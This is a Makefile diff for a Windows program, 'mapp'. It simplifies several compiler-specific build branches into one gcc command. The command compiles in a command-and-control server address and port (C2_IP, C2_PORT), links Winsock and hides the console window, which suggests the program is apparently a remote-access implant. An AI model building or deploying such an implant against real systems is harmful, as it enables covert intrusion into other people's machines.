@@ -3,6 +3,7 @@ SRC = main.c
 TARGET = mapp
 BIN = $(TARGET)
 
+.PHONY: all clean
 
 define wininput
 ifeq ($(C2_IP),)
@@ -31,22 +32,10 @@ CC := gcc
 endif
 
 
-all:
+all: $(SRC)
 ifeq ($(OS),Windows_NT)
 	$(eval $(call wininput))
-ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
-	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
-else
-ifeq ($(findstring MSYS,$(shell uname -s)),MSYS) # MSYS/MSYS2
-	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
-endif
-ifeq ($(shell uname -s),Windows_NT) # W32/64devkit
-	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
-endif
-ifeq ($(findstring cygwin,$(shell uname -s)),cygwin) # Cygwin
-	$(CC) $(SRC) -o $(BIN) -Os -s -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
-endif
-endif
+	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
 endif
 
 
